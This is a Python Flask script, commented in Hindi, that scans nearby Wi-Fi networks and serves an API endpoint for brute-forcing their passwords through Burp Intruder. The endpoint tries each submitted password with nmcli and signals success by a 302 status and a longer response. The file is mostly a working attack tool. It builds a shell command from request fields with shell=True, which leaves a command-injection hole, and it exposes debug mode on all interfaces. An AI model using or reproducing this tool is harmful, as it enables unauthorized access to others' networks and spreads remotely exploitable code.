import os
import subprocess
import time
from flask import Flask, render_template, request, jsonify, make_response

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan')
def scan():
    # आस-पास के सभी वाईफाई को स्कैन करने के लिए
    subprocess.run(["nmcli", "device", "wifi", "rescan"], capture_output=True)
    cmd = "nmcli -t -f SSID,BSSID,SIGNAL dev wifi"
    output = subprocess.check_output(cmd.split()).decode('utf-8').strip().split('\n')
    networks = []
    seen = set()
    for line in output:
        if line.strip() and ':' in line:
            parts = line.split(':')
            ssid = parts[0]
            if ssid and ssid not in seen:
                networks.append(ssid)
                seen.add(ssid)
    return jsonify(networks)

# BURP INTRUDER के लिए सबसे सटीक API
@app.route('/api/brute', methods=['POST'])
def brute_api():
    data = request.get_json()
    ssid = data.get('ssid')
    password = data.get('password')

    # पुराना प्रोफाइल डिलीट करना (जरूरी है)
    subprocess.run(["nmcli", "connection", "delete", "id", ssid], capture_output=True)
    
    # NMCLI Connect - Wait time 8 seconds (Stable connection के लिए)
    cmd = f"nmcli dev wifi connect '{ssid}' password '{password}'"
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    if res.returncode == 0:
        # SUCCESS: Status 302 और लम्बी Length भेजेगा (Burp में अलग दिखेगा)
        resp = make_response(jsonify({
            "status": "SUCCESS", 
            "key": "FOUND_WIFI_PASSWORD_ACCESS_GRANTED",
            "password": password
        }), 302)
        resp.headers['Location'] = '/success'
        return resp
    else:
        # FAILED: Status 401 और छोटी Length
        return jsonify({"status": "FAIL", "msg": "invalid"}), 401

if __name__ == '__main__':
    # 0.0.0.0 ताकि Burp इसे IP के जरिए पकड़ सके
    app.run(host='0.0.0.0', port=5000, debug=True)

